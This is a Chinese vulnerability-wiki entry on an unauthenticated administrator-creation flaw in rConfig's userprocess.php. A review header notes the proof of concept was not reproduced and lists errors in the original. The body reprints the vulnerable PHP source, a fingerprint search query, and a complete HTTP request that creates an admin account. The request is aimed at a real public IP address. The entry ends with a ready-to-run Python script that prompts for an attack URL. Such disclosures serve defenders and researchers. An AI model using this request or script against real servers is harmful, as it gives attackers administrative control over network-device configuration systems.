---
version: "rConfig"
source: "Threekiii/Vulnerability-Wiki"
id: "vw-0ad988e5993943a4f542dfc2"
entity_id: "ve-0ad988e5993943a4f542dfc2"
schema_version: "1"
title: "rConfig userprocess.php 任意用户创建漏洞"
product: "rConfig"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "未登录POST add/editid空；ulevelid9；无软件版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/rConfig/rConfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

# rConfig userprocess.php 任意用户创建漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：rConfig
- 本文讨论：userprocess.php无授权注册管理员，另有更新分支
- 版本、权限与配置前提：未登录POST add/editid空；ulevelid9；无软件版本
- 资料类型：账户创建源码研究；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 文件名误写userproce.php；未展示session.register内部检查，外层缺鉴权不足独立证明所有版本
- 脚本allow_redirects false且仅检查响应body不含error，PHP通过Location?error跳转会误报
- 示例残留真实公网目标；缺版本/补丁/CVE
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 注册函数权限、版本范围和后续登录确证待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

rConfig userprocess.php 存在任意用户创建漏洞，发送特定的请求包攻击者可以创建管理员账户登录后台

## 漏洞影响

```
rConfig
```

## 网络测绘

```
app="rConfig"
```

## 漏洞复现

出现漏洞的文件为 userproce.php

```php
<?php

/**
 * Process.php
 * 
 * The Process class is meant to simplify the task of processing
 * user submitted forms, redirecting the user to the correct
 * pages if errors are found, or if form is successful, either
 * way. Also handles the logout procedure.
 *
 * Written by: Jpmaster77 a.k.a. The Grandmaster of C++ (GMC)
 * Last Updated: August 19, 2004
 */
include("/home/rconfig/classes/usersession.class.php");

class Process {
    /* Class constructor */

    function Process() {
        global $session;
        /* User submitted login form */
        if (isset($_POST['sublogin'])) {
            $this->procLogin();
        }
        /* Admin submitted user add form */ else if (isset($_POST['add']) && isset($_POST['editid']) && empty($_POST['editid'])) {
            $this->procRegister();
        }
        /* Admin submitted user edit form */ else if (isset($_POST['add']) && isset($_POST['editid']) && !empty($_POST['editid'])) {
            $this->procUpdateAccount();
        }
        /* User submitted forgot password form */ else if (isset($_POST['subforgot'])) {
            $this->procForgotPass();
        }
        /* User submitted edit account form */ else if (isset($_POST['subedit'])) {
            $this->procEditAccount();
        }
        /**
         * The only other reason user should be directed here
         * is if he wants to logout, which means user is
         * logged in currently.
         */ else if ($session->logged_in) {
            $this->procLogout();
        }
        /**
         * Should not get here, which means user is viewing this page
         * by mistake and therefore is redirected.
         */ else {
            header("Location: /login.php");
        }
    }

    /**
     * procLogin - Processes the user submitted login form, if errors
     * are found, the user is redirected to correct the information,
     * if not, the user is effectively logged in to the system.
     */
    function procLogin() {
        global $session, $form;
        /* Login attempt */
        $retval = $session->login($_POST['user'], $_POST['pass'], isset($_POST['remember']));
        /* Login successful */
        if ($retval) {
            header("Location: " . $session->referrer);
        }
        /* Login failed */ else {
            $_SESSION['value_array'] = $_POST;
            $_SESSION['error_array'] = $form->getErrorArray();
            header("Location: " . $session->referrer);
        }
    }

    /**
     * procLogout - Simply attempts to log the user out of the system
     * given that there is no logout form to process.
     */
    function procLogout() {
        global $session;
        $retval = $session->logout();
        header("Location: /login.php");
    }

    /**
     * procRegister - Processes the user submitted registration form,
     * if errors are found, the user is redirected to correct the
     * information, if not, the user is effectively registered with
     * the system and an email is (optionally) sent to the newly
     * created user.
     */
    function procRegister() {
        global $session, $form;
        /* Convert username to all lowercase (by option) */
        if (ALL_LOWERCASE) {
            $_POST['username'] = strtolower($_POST['username']);
        }
        /* Registration attempt */
        $retval = $session->register($_POST['username'], $_POST['password'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']);

        /* Registration Successful */
        if ($retval == 0) {
            $_SESSION['reguname'] = $_POST['username'];
            $_SESSION['regsuccess'] = true;
            $errors['Success'] = "User " . $_POST['username'] . " successfully added to Database";
            $_SESSION['errors'] = $errors;
            header("Location: " . $session->referrer);
        }
        /* Error found with form */ else if ($retval == 1) {
            $_SESSION['value_array'] = $_POST;
            $_SESSION['errors'] = $form->getErrorArray();
            header("Location: " . $session->referrer . "?error");
        }
        /* Registration attempt failed */ else if ($retval == 2) {
            $_SESSION['reguname'] = $_POST['username'];
            $_SESSION['regsuccess'] = false;
            $errors['Fail'] = "ERROR: User " . $_POST['username'] . " could not be added to Database";
            $_SESSION['errors'] = $errors;
            header("Location: " . $session->referrer);
        }
    }

    /**
     * procForgotPass - Validates the given username then if
     * everything is fine, a new password is generated and
     * emailed to the address the user gave on sign up.
     */
    function procForgotPass() {
        global $database, $session, $mailer, $form;
        /* Username error checking */
        $subuser = $_POST['user'];
        $field = "user";  //Use field name for username
        if (!$subuser || strlen($subuser = trim($subuser)) == 0) {
            $form->setError($field, "Username not entered<br>");
            $_SESSION['value_array'] = $_POST;
            $_SESSION['errors'] = $form->getErrorArray();
            header("Location: " . $session->referrer . "?error");
        } else {
            /* Make sure username is in database */
            $subuser = stripslashes($subuser);
            if (strlen($subuser) < 5 || strlen($subuser) > 30 ||
                    !preg_match("/^([0-9a-z])+$/", $subuser) ||
                    (!$database->usernameTaken($subuser))) {
                $form->setError($field, "Unknown Username");
                $_SESSION['value_array'] = $_POST;
                $_SESSION['errors'] = $form->getErrorArray();
                header("Location: " . $session->referrer . "?error");
            }
        }
        /* Errors exist, have user correct them */
        if ($form->num_errors > 0) {
            $_SESSION['value_array'] = $_POST;
            $_SESSION['error_array'] = $form->getErrorArray();
        } else {
            /* Generate new password */
            $newpass = $session->generateRandStr(8);
            /* Get email of user */
            $usrinf = $database->getUserInfo($subuser);
            $email = $usrinf['email'];
            /* Attempt to send the email with new password */
            if ($mailer->sendNewPass($subuser, $email, $newpass)) {
                /* Email sent, update database */
                $database->updateUserField($subuser, "password", md5($newpass));
                echo "<script>"
                . "alert('Your new password has been generated. The password was emailed to $email');"
                . "window.close();"
                . "</script>";
            }/* Email failure, do not change password */ 
            else {
                $_SESSION['forgotpass'] = false;
            }
        }
    }

    /**
     * procEditAccount - Attempts to edit the user's account
     * information, including the password, which must be verified
     * before a change is made.
     */
    function procEditAccount() {
        global $session, $form;
        /* Account edit attempt */
        $retval = $session->editAccount($_POST['editid'], $_POST['username'], $_POST['curpass'], $_POST['newpass'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']);

        /* Account edit successful */
        if ($retval == 0) {
            $_SESSION['useredit'] = $_POST['username'];
            $_SESSION['useredit'] = true;
            $errors['Success'] = "User " . $_POST['username'] . " successfully edited";
            $_SESSION['errors'] = $errors;
            header("Location: " . $session->referrer);
        }
        /* Error found with form */ else if ($retval == 1) {
            $_SESSION['value_array'] = $_POST;
            $_SESSION['errors'] = $form->getErrorArray();
            header("Location: " . $session->referrer . "?error");
        }
        /* Registration attempt failed */ else if ($retval == 2) {
            $_SESSION['useredit'] = $_POST['username'];
            $_SESSION['regsuccess'] = false;
            $errors['Fail'] = "ERROR: User " . $_POST['username'] . " could not be edited";
            $_SESSION['errors'] = $errors;
            header("Location: " . $session->referrer);
        }
    }

    /**
     * procEditAccount - Attempts to edit the user's account
     * information, including the password, which must be verified
     * before a change is made.
     */
    function procUpdateAccount() {
        // http or https check for url Protocol
        $protocol = 'http';
        if (isset($_SERVER['HTTPS'])) {
            if (strtoupper($_SERVER['HTTPS']) == 'ON') {
                $protocol = 'https';
            }
        }

        global $session, $form;
        /* Account edit attempt */
        $retval = $session->updateAccount($_POST['editid'], $_POST['username'], $_POST['password'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']);

        /* Account edit successful */
        if ($retval == 0) {
            $_SESSION['useredit'] = $_POST['username'];
            $_SESSION['useredit'] = true;
            $errors['Success'] = "User " . $_POST['username'] . " successfully edited";
            $_SESSION['errors'] = $errors;
            header("Location: " . $protocol . "://" . $_SERVER['HTTP_HOST'] . "/" . "useradmin.php");
        }
        /* Error found with form */ else if ($retval == 1) {
            $_SESSION['value_array'] = $_POST;
            $_SESSION['errors'] = $form->getErrorArray();
            header("Location: " . $protocol . "://" . $_SERVER['HTTP_HOST'] . "/" . "useradmin.php?error");
        }
        /* Registration attempt failed */ else if ($retval == 2) {
            $_SESSION['useredit'] = $_POST['username'];
            $_SESSION['regsuccess'] = false;
            $errors['Fail'] = "ERROR: User " . $_POST['username'] . " could not be edited";
            $_SESSION['errors'] = $errors;
            header("Location: " . $protocol . "://" . $_SERVER['HTTP_HOST'] . "/" . "useradmin.php");
        }
    }

}

/* Initialize process */
$process = new Process;
```

出现漏洞的原因是对权限设定错误，任何人都可以通过访问这个文件创建管理员用户

发送如下请求包创建管理员用户 testtest，密码为 testtest[@123 ]() 

```http
POST /lib/crud/userprocess.php HTTP/1.1
Host: 194.149.41.11
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: multipart/form-data; boundary=b1467349fcce4aa0ae8d44439f4e06bc
Upgrade-Insecure-Requests: 1
Referer: http://194.149.41.11/useradmin.php
Origin: http://194.149.41.11/
Cookie: PHPSESSID=test
Content-Length: 697

--b1467349fcce4aa0ae8d44439f4e06bc
Content-Disposition: form-data; name="username"

testtest
--b1467349fcce4aa0ae8d44439f4e06bc
Content-Disposition: form-data; name="password"

testtest@123
--b1467349fcce4aa0ae8d44439f4e06bc
Content-Disposition: form-data; name="passconf"

testtest@123
--b1467349fcce4aa0ae8d44439f4e06bc
Content-Disposition: form-data; name="email"

testtest@test.com
--b1467349fcce4aa0ae8d44439f4e06bc
Content-Disposition: form-data; name="ulevelid"

9
--b1467349fcce4aa0ae8d44439f4e06bc
Content-Disposition: form-data; name="add"

add
--b1467349fcce4aa0ae8d44439f4e06bc
Content-Disposition: form-data; name="editid"


--b1467349fcce4aa0ae8d44439f4e06bc--
```

![](./.resource/rConfig-userprocess.php-任意用户创建漏洞/media/202202162241827.png)


成功创建用户 testtest，以管理员身份登录后台

![](./.resource/rConfig-userprocess.php-任意用户创建漏洞/media/202202162242368.png)


## 漏洞POC

```python
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_toolbelt.multipart.encoder import MultipartEncoder

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: rConfig userprocess.php 任意用户创建漏洞                     \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/lib/crud/userprocess.php"
    referer = target_url + "useradmin.php"
    ran_number = random.randint(1, 999)
    origin = target_url
    multipart_data = MultipartEncoder(
        fields={
            'username': 'testtest{}'.format(ran_number),
            'password': 'testtest@{}'.format(ran_number),
            'passconf': 'testtest@{}'.format(ran_number),
            'email': 'testtest{}@test.com'.format(ran_number),
            'ulevelid': '9',
            'add': 'add',
            'editid': ''
        }
    )
    headers = {'Content-Type': multipart_data.content_type, "Upgrade-Insecure-Requests": "1", "Referer": referer,
               "Origin": origin}
    cookies = {'PHPSESSID': 'testtest{}'.format(ran_number)}
    print("\033[36m[o] 正在创建账户..... \033[0m".format(ran_number, ran_number))
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False)
        if "error" not in response.text:
            print("\033[36m[o] 成功创建账户 testtest{}/testtest@{} \033[0m".format(ran_number, ran_number))
        else:
            print("\033[31m[x] 创建失败:{} \033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

#
if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
```

![](./.resource/rConfig-userprocess.php-任意用户创建漏洞/media/202202162242409.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
